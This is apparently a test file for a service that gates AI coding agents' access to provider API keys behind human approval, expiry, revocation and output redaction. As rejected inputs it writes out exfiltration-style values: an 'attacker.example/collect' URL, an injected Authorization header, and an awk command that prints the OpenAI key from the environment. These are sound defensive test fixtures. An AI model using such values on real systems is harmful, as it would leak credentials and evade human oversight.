import assert from "node:assert/strict";
import test from "node:test";
import { AgentControlService } from "../src/main/services/AgentControlService.ts";
import { registerBacklogIpc } from "../src/main/ipc/registerBacklogIpc.ts";
import { SecretGrantService } from "../src/main/services/SecretGrantService.ts";
import { ScopedOrchestrationHandler } from "../src/main/services/agent-browser/OrchestrationTools.ts";
import { TerminalManager } from "../src/main/services/TerminalManager.ts";
import { PROVIDER_SECRET_IDS as CONTRACT_SECRET_IDS } from "../src/shared/contracts.ts";
import { BACKLOG_IPC } from "../src/shared/backlog.ts";
import { PROVIDER_SECRET_IDS as CATALOG_SECRET_IDS, validateOrchestrationArguments } from "../src/agent-browser/orchestration-catalog.mjs";
import { availableRegistry, fakeSpawner } from "./helpers/terminal.mjs";

function setup(overrides = {}) {
  let now = 1_000;
  let active = true;
  const executions = [];
  const observedExecutionSecrets = [];
  const events = [];
  const secret = "unit-test-secret-7342";
  const service = new SecretGrantService({
    getSecret: async (id) => id === "OPENAI_API_KEY" ? secret : null,
    getSession: (sessionId) => sessionId === "session-a" && active
      ? { provider: "codex", cwd: "/project", profile: "normal", active: true }
      : null,
    getTurnIdentity: () => "fixture-launch:turn-1",
    rememberSecret: (value) => events.push(["remember", value]),
    redact: (value) => value.replaceAll(secret, "[masked]"),
    execute: async (request) => {
      executions.push(request);
      observedExecutionSecrets.push(request.secret);
      return { status: 200, body: `received ${request.secret}`, truncated: false };
    },
    onRequest: (request) => events.push(["request", request]),
    onDecision: (decision) => events.push(["decision", decision]),
    onRevoke: (revoke) => events.push(["revoke", revoke]),
    now: () => now,
    ...overrides
  });
  return {
    service,
    executions,
    observedExecutionSecrets,
    events,
    secret,
    setNow(value) { now = value; },
    endSession() { active = false; }
  };
}

test("secret tool catalog stays aligned with configured provider secret IDs", () => {
  assert.deepEqual([...CATALOG_SECRET_IDS], [...CONTRACT_SECRET_IDS]);
  assert.equal(validateOrchestrationArguments("request_secret", {
    secretId: "OPENAI_API_KEY", reason: "Use the configured key for one API check."
  }).ok, true);
  assert.equal(validateOrchestrationArguments("request_secret", {
    secretId: "HOME", reason: "Read a local system variable."
  }).ok, false);
  assert.equal(validateOrchestrationArguments("run_secret_command", {
    command: "/usr/bin/awk", args: [], secretIds: ["OPENAI_API_KEY"]
  }).ok, false, "cached clients cannot invoke the removed executable tool");
  const api = validateOrchestrationArguments("run_secret_request", {
    secretId: "OPENAI_API_KEY", method: "POST", path: "responses", body: { input: "hello" }
  });
  assert.equal(api.ok, true);
  assert.deepEqual(api.value.body, { input: "hello" }, "the bridge preserves typed JSON bodies");
  assert.equal(validateOrchestrationArguments("run_secret_request", {
    secretId: "OPENAI_API_KEY", method: "POST", path: "responses", headers: { Authorization: "Bearer attacker" }
  }).ok, false);
});

test("only a host-resolved profile using the granted key selects the API origin", async () => {
  let secretReads = 0;
  let resolvedUrl = "";
  const { service } = setup({
    getSecret: async () => { secretReads += 1; return "unit-test-secret-7342"; },
    getApiProfiles: () => [{ id: "team-profile", name: "Team gateway", protocol: "openai-compatible", baseUrl: "https://api.example.com/v1", secretRef: "OPENAI_API_KEY" }],
    execute: async (request) => {
      resolvedUrl = request.apiProfile.baseUrl;
      return { status: 200, body: "ok", truncated: false };
    }
  });
  const pending = service.requestSecret("session-a", "OPENAI_API_KEY", "Use the approved key for one API check.");
  service.approve(pending.id, "session");
  await assert.rejects(service.runSecretRequest("session-a", {
    secretId: "OPENAI_API_KEY", apiProfileId: "team-profile", method: "GET", path: "models", baseUrl: "https://attacker.example"
  }), /request is invalid/u);
  assert.equal(secretReads, 0, "invalid caller-supplied origins are rejected before loading the key");
  await service.runSecretRequest("session-a", {
    secretId: "OPENAI_API_KEY", apiProfileId: "team-profile", method: "GET", path: "models"
  });
  assert.equal(resolvedUrl, "https://api.example.com/v1");
  assert.equal(secretReads, 1);
});

test("typed provider API requests fail closed until human approval and return no secret material", async () => {
  const { service, executions, observedExecutionSecrets, events, secret } = setup();
  await assert.rejects(service.runSecretRequest("session-a", {
    secretId: "OPENAI_API_KEY", method: "GET", path: "models"
  }), /Human approval is required/u);

  const request = service.requestSecret("session-a", "OPENAI_API_KEY", "Use the project API to check a model response.");
  assert.equal(request.secretId, "OPENAI_API_KEY");
  assert.equal("value" in request, false);
  assert.deepEqual(service.pending(["other-session"]), []);
  assert.deepEqual(service.pending(["session-a"]).map(({ id }) => id), [request.id]);
  service.approve(request.id, "turn");
  const result = await service.runSecretRequest("session-a", {
    secretId: "OPENAI_API_KEY", method: "GET", path: "models"
  });
  assert.deepEqual(result, { status: 200, body: "received [masked]", truncated: false });
  assert.equal(JSON.stringify(result).includes(secret), false);
  assert.equal(executions.length, 1);
  assert.deepEqual(observedExecutionSecrets, [secret]);
  assert.equal(executions[0].secret, secret, "only the host executor receives the secret for the fixed helper");
  assert.equal(executions[0].cwd, "/project");
  assert.equal(executions[0].launchProfile, "normal");
  assert.equal(executions[0].apiProfile.baseUrl, "https://api.openai.com/v1");
  assert.equal(executions[0].path, "models");
  assert.equal(events.some(([type]) => type === "remember"), true, "register the key with the redactor before execution");
  assert.equal(service.listGrants()[0].secretId, "OPENAI_API_KEY");
});

test("grant expiry is checked for every run and turn/session end revoke the right scopes", async () => {
  const { service, setNow, events } = setup();
  const short = service.requestSecret("session-a", "OPENAI_API_KEY", "Check current usage.");
  service.approve(short.id, "10m");
  setNow(1_000 + 10 * 60_000);
  assert.equal(service.listGrants().length, 0, "expired grants disappear before an API request triggers its own expiry check");
  await assert.rejects(service.runSecretRequest("session-a", {
    secretId: "OPENAI_API_KEY", method: "GET", path: "models"
  }), /Human approval is required/u);

  const turn = service.requestSecret("session-a", "OPENAI_API_KEY", "Use for this turn.");
  service.approve(turn.id, "turn");
  service.turnEnded("session-a");
  assert.equal(service.listGrants().length, 0);
  assert.ok(events.some(([type, event]) => type === "revoke" && event.reason === "turn-ended"));

  const session = service.requestSecret("session-a", "OPENAI_API_KEY", "Use for this session.");
  service.approve(session.id, "session");
  service.turnEnded("session-a");
  assert.equal(service.listGrants().length, 1, "session grant survives turn completion");
  service.sessionEnded("session-a");
  assert.equal(service.listGrants().length, 0);
});

test("request expiry, denial, invalid API requests, and missing isolation fail closed", async () => {
  const { service, setNow } = setup({ execute: undefined });
  const expired = service.requestSecret("session-a", "OPENAI_API_KEY", "One-off request.");
  setNow(expired.expiresAt);
  assert.deepEqual(service.pending(), []);
  assert.throws(() => service.approve(expired.id, "session"), /expired/u);

  const denied = service.requestSecret("session-a", "OPENAI_API_KEY", "Do not use automatically.");
  service.deny(denied.id);
  assert.equal(service.pending().length, 0);
  assert.throws(() => service.approve(denied.id, "session"), /expired/u);

  const request = service.requestSecret("session-a", "OPENAI_API_KEY", "Use approved key.");
  service.approve(request.id, "session");
  await assert.rejects(service.runSecretRequest("session-a", {
    secretId: "OPENAI_API_KEY", method: "GET", path: "https://attacker.example/collect"
  }), /relative to the selected profile/u);
  await assert.rejects(service.runSecretRequest("session-a", {
    secretId: "OPENAI_API_KEY", method: "GET", path: "models", headers: { Authorization: "attacker" }
  }), /request is invalid/u);
  await assert.rejects(service.runSecretRequest("session-a", {
    secretId: "OPENAI_API_KEY", method: "GET", path: "models", apiProfileId: "anthropic"
  }), /different provider secret/u);
  await assert.rejects(service.runSecretRequest("session-a", {
    secretId: "DEVIN_API_KEY", method: "GET", path: "models"
  }), /not supported/u);
  await assert.rejects(service.runSecretRequest("session-a", {
    secretId: "OPENAI_API_KEY", method: "GET", path: "models"
  }), /API requests are unavailable/u);
});

test("legacy arbitrary secret commands fail closed even after an approval is granted", async () => {
  const { service, executions } = setup();
  const request = service.requestSecret("session-a", "OPENAI_API_KEY", "Use for a bounded API request.");
  service.approve(request.id, "session");
  await assert.rejects(service.runSecretCommand("session-a", {
    command: "/usr/bin/awk", args: [`BEGIN { print ENVIRON["OPENAI_API_KEY"] }`], secretIds: ["OPENAI_API_KEY"]
  }), /Arbitrary secret-bearing commands are disabled/u);
  assert.deepEqual(executions, [], "rejected commands never reach the secret-bearing executor");
});

test("masked output is capped after redaction and revocation aborts an active API request", async () => {
  let started;
  const waiting = new Promise((resolve) => { started = resolve; });
  const { service, secret } = setup({
    execute: (request) => new Promise((resolve, reject) => {
      started();
      request.signal.addEventListener("abort", () => reject(new Error("canceled")), { once: true });
      void resolve;
    })
  });
  const request = service.requestSecret("session-a", "OPENAI_API_KEY", "Run once.");
  service.approve(request.id, "turn");
  const running = service.runSecretRequest("session-a", { secretId: "OPENAI_API_KEY", method: "GET", path: "models" });
  await waiting;
  service.turnEnded("session-a");
  await assert.rejects(running, /canceled/u);

  const outputService = setup({ execute: async () => ({ status: 200, body: `${"x".repeat(20_000)}unit-test-secret-7342`, truncated: false }) });
  const outputRequest = outputService.service.requestSecret("session-a", "OPENAI_API_KEY", "Check output cap.");
  outputService.service.approve(outputRequest.id, "session");
  const output = await outputService.service.runSecretRequest("session-a", {
    secretId: "OPENAI_API_KEY", method: "GET", path: "models"
  });
  assert.ok(Buffer.byteLength(output.body) <= 16 * 1024);
  assert.equal(output.body.includes(secret), false);
});

test("orchestration exposes secret request/run tools to agents but not read-only reviewers", async (t) => {
  const calls = [];
  const terminals = new TerminalManager(() => undefined, availableRegistry(), undefined, undefined, true, fakeSpawner(calls));
  t.after(() => terminals.disposeAll());
  const cwd = process.cwd();
  const at = { x: 0, y: 0 };
  const root = terminals.create({ provider: "codex", profile: "normal", cwd, position: at, role: "orchestrator" });
  const control = new AgentControlService(terminals);
  const agent = await control.spawn({ parentSessionId: root.id, provider: "opencode", cwd });
  const reviewer = await control.spawn({ parentSessionId: root.id, provider: "opencode", cwd, profile: "plan", readOnlyReview: true });
  const grants = new SecretGrantService({
    getSecret: async () => "not-returned",
    getSession: (sessionId) => {
      const metadata = terminals.getMetadata(sessionId);
      return metadata ? { provider: metadata.provider, cwd: metadata.cwd, profile: metadata.profile, active: metadata.exitCode === null } : null;
    },
    execute: async () => ({ status: 200, body: "", truncated: false })
  });
  const handler = new ScopedOrchestrationHandler(control, null, undefined, { secretGrants: grants });
  const secretToolNames = handler.listTools(agent.id).map((tool) => tool.name).filter((name) => name.includes("secret"));
  assert.deepEqual(secretToolNames, ["request_secret", "run_secret_request"]);
  assert.deepEqual(handler.listTools(reviewer.id), []);
  const response = await handler.execute(agent.id, {
    id: "request-secret",
    tool: "request_secret",
    arguments: { secretId: "OPENAI_API_KEY", reason: "Verify the configured provider key." }
  });
  assert.equal(response.pendingApproval, true);
  assert.equal(grants.pending([agent.id]).length, 1);
  await assert.rejects(handler.execute(agent.id, {
    id: "run-secret",
    tool: "run_secret_request",
    arguments: { secretId: "OPENAI_API_KEY", method: "GET", path: "models" }
  }), /Human approval is required/u);
});

test("secret approval IPC is main-window-only and cannot cross task roots", async (t) => {
  const calls = [];
  const terminals = new TerminalManager(() => undefined, availableRegistry(), undefined, undefined, true, fakeSpawner(calls));
  t.after(() => terminals.disposeAll());
  const cwd = process.cwd();
  const at = { x: 0, y: 0 };
  const firstRoot = terminals.create({ provider: "codex", profile: "normal", cwd, position: at, role: "orchestrator" });
  const secondRoot = terminals.create({ provider: "codex", profile: "normal", cwd, position: at, role: "orchestrator" });
  const control = new AgentControlService(terminals);
  const child = await control.spawn({ parentSessionId: firstRoot.id, provider: "opencode", cwd });
  const otherChild = await control.spawn({ parentSessionId: secondRoot.id, provider: "opencode", cwd });
  const service = new SecretGrantService({
    getSecret: async () => "never-return-this",
    getTurnIdentity: () => "trusted-fixture-launch:turn-1",
    getSession: (sessionId) => {
      const metadata = terminals.getMetadata(sessionId);
      return metadata ? { provider: metadata.provider, cwd: metadata.cwd, profile: metadata.profile, active: metadata.exitCode === null } : null;
    },
    execute: async () => ({ status: 200, body: "", truncated: false })
  });
  const mainFrame = {};
  const webContents = { mainFrame };
  const mainWindow = { webContents };
  const handlers = new Map();
  registerBacklogIpc({ handle: (channel, callback) => handlers.set(channel, callback) }, {
    usagePrices: { get: () => [], set: async (rows) => rows }, board: {subscribe:()=>()=>{}}, budgets: {}, flows: {},
    taskRoot: (id) => control.taskRoot(id), attention: {}, secretGrants: service, terminals, timeline: {},
    checkpoints: {}, workspace: {}, getMainWindow: () => mainWindow
  });
  const trusted = { sender: webContents, senderFrame: mainFrame };
  const request = service.requestSecret(child.id, "OPENAI_API_KEY", "Run a scoped project check.");
  const foreignRequest = service.requestSecret(otherChild.id, "OPENAI_API_KEY", "This is a different task.");
  assert.deepEqual((await handlers.get(BACKLOG_IPC.secretRequests)(trusted, firstRoot.id)).map((row) => row.id), [request.id]);
  assert.throws(() => handlers.get(BACKLOG_IPC.approveSecretRequest)(trusted, firstRoot.id, foreignRequest.id, "session"), /request is outside this task/u);
  assert.throws(() => handlers.get(BACKLOG_IPC.secretRequests)({ sender: {}, senderFrame: mainFrame }, firstRoot.id), /Untrusted backlog caller/u);
  const grant = await handlers.get(BACKLOG_IPC.approveSecretRequest)(trusted, firstRoot.id, request.id, "turn");
  assert.equal(grant.sessionId, child.id);
  assert.equal("value" in grant, false);
  assert.throws(() => handlers.get(BACKLOG_IPC.revokeSecretGrant)(trusted, firstRoot.id, otherChild.id, "OPENAI_API_KEY"), /outside this task/u);
});
